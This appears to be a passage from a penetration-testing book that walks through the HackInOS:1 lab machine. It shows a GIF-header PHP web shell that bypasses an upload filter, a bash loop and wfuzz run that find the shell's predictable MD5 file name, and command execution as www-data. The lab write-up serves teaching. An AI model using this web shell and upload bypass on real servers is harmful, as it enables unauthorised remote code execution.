    \n# [HackInOS:1](#toc.xhtml_s121a)\n\nDuring the enumeration phase we had come\
    \ across a PHP upload page on the webserver. The HTML source of the upload.php\
    \ page contained a comment which provided us with a link to the developer’s GitHub\
    \ page.\n\nLet’s open the upload.php source code page on GitHub using firefox\
    \ browser. **[https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php](https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php)**\n\
    \nAfter reading the source code, you will get a fair amount of understanding regarding\
    \ the functioning of the upload file. Let’s see what all we discovered in the\
    \ file:\n\n**`$target_dir = \"uploads/\";`**\n\nLocation of file upload directory\
    \ is uploads.\n\n**`if($check[\"mime\"] == \"image/png\" || $check[\"mime\"] ==\
    \ \"image/gif\"){`**\n\nThe server checks the type based on mime-type, and types\
    \ of files allowed are png and gif.\n\n**`$rand_number = rand(1,100);`**\n\nA\
    \ random number picked is from a small set of numbers ranging from 1 to 100.\n\
    \n**`$target_file = $target_dir . md5(basename($_FILES[\"file\"][\"name\"].$rand_number));`**\n\
    \nNaming convention followed after the files are uploaded on the server.\n\nWith\
    \ the information at hand let’s create a basic php shell file containing GIF tags\
    \ to bypass the upload filter at the server end to check and ultimately demonstrate\
    \ the vulnerability.\n\nOpen a terminal, and use the command **`nano cmd.php`**\
    \ to create a file called **`cmd.php`**, and add the following data to the file\
    \ contents:\n\n**`GIF89a;`**\n\n**`<? system($_GET['cmd']);?>`**\n\nThe above\
    \ **`cmd.php`** file will give us basic access to the remote server, and allow\
    \ us to execute simple system commands on the target through our web browser.\n\
    \nBrowse to **`http://10.0.2.4:8000/upload.php`** using Firefox Browser and upload\
    \ the **`cmd.php`** file that we created.\n\n![](images/Figure-7.23.jpg)\n\n**Figure\
    \ 7.23:** uploading cmd.php\n\nOnce you have uploaded the **`cmd.php`** file to\
    \ the server, we will still not be able to access the **`cmd.php`** file as the\
    \ name was changed by the upload script. we need to find out its new name after\
    \ getting uploaded.\n\nWhat we do know so far is that the file will be named as\
    \ MD5 hash of the original filename (**`cmd.php`**) appended with a random number\
    \ from 1-100, so the final file name present in the **`/uploads`** directory will\
    \ be MD5 hash of any of the values ranging from **`cmd.php1`**, **`cmd.php2`**\
    \ until **`cmd.php100`**.\n\nWe will generate the **`md5sum`** of the string **`cmd.php1`**,\
    \ **`cmd.php2`**, **`cmd.php3`**, and so on using the command **`echo -n cmd.php(n)\
    \ | md5sum`** within a terminal.\n\n![](images/Figure-7.24.jpg)\n\n**Figure 7.24:**\
    \ Creating MD5 hash strings\n\nAs you can see, we have generated the 32-byte MD5\
    \ hash for string **`cmd.php1`** along with a few spaces and - added at the end.\n\
    \nThe preceding approach of issuing commands one after the other will be very\
    \ tedious and inefficient process and end up taking a lot of time and effort so\
    \ let’s automate the process and store all the hashes in a file **`md5strings.txt`**\
    \ using a bash ‘for’ loop.\n\n**`for ((i=1; i<=100; i++)); do echo -n cmd.php$i\
    \ | md5sum; done | cut -d \" \" -f1 > md5strings.txt`**\n\nThe ‘for’ loop above\
    \ generates a list of md5 hashes, the extra - at the end of md5sum output is sanitized\
    \ by piping it through the ‘**`cut`**’ command. The **`-d`** flag in the cut command\
    \ sets the delimiter to the space character and the **`-f`** flag extracts the\
    \ field number specified and stores the filtered results to the **`md5strings.txt`**\
    \ file.\n\nIn the preceding example we have set the delimiter to <space> and field\
    \ to ‘1’ which contains the md5 hash string.\n\n![](images/Figure-7.25.jpg)\n\n\
    **Figure 7.25:** Automating md5 hash creation\n\nThe small bash script of ours\
    \ created a sanitized list of md5 hashes for all possible file names ranging from\
    \ **`cmd.php1`** to **`cmd.php100`**.\n\nThe file has been uploaded, and we just\
    \ need to check for the presence of these files on the **`/uploads`** directory\
    \ of the target server. Since we are dealing with a large list of potential file\
    \ names which needs to be checked on the server, we will automate the process\
    \ for finding the list of files on the server using a tool called *wfuzz*.\n\n\
    Open a terminal and run the command **`wfuzz -w md5strings.txt --hc 404`****`http://10.0.2.4:8000/uploads/FUZZ.php`**\n\
    \nThe wfuzz tool is a network-based web application fuzzing tool which supports\
    \ brute-forcing of web applications, the tool operated by replacing the ‘FUZZ’\
    \ keyword with the values specified in payload. The **`-w`** flag is used to specify\
    \ a filename containing the list of FUZZ words while the **`--hc`** flag hides\
    \ responses with the specified http status code.\n\n![](images/Figure-7.26.jpg)\n\
    \n**Figure 7.26:** Fuzzing /uploads directory for files\n\nWe were able to identify\
    \ the name of the uploaded **`cmd.php`** file, the new file exists at **http://10.0.2.4:8000/uploads/032e6bb36946eccf17ab1a2af2bf86a0.php**\n\
    \n**Note:** The target system periodically deletes the cmd.php file uploaded to\
    \ the /uploads directory; re-upload the cmd.php and run the wfuzz command in cases\
    \ where the fuzzer is unable to find the file or whenever you are not able to\
    \ access the webshell through browser.\n\nAccess the simple php web-shell we uploaded\
    \ earlier using Firefox and execute the ‘id’ command on the target **http://10.0.2.4:8000/uploads/<md5string>.php?cmd=id**\n\
    \n![](images/Figure-7.27.jpg)\n\n**Figure 7.27:** executing id command using cmd.php\
    \ webshell\n\nThe output of the ‘id’ command shows that webshell is running with\
    \ privileges of www-data.\n\nWe will search for vulnerabilities on the services\
    \ and applications running on the target machine employing the information found\
    \ in the previous phases:\n\nApache2 package version 2.4.25\n\nWordPress version\
    \ 5.0.3\n\nOpenSSH version 7.2p2"
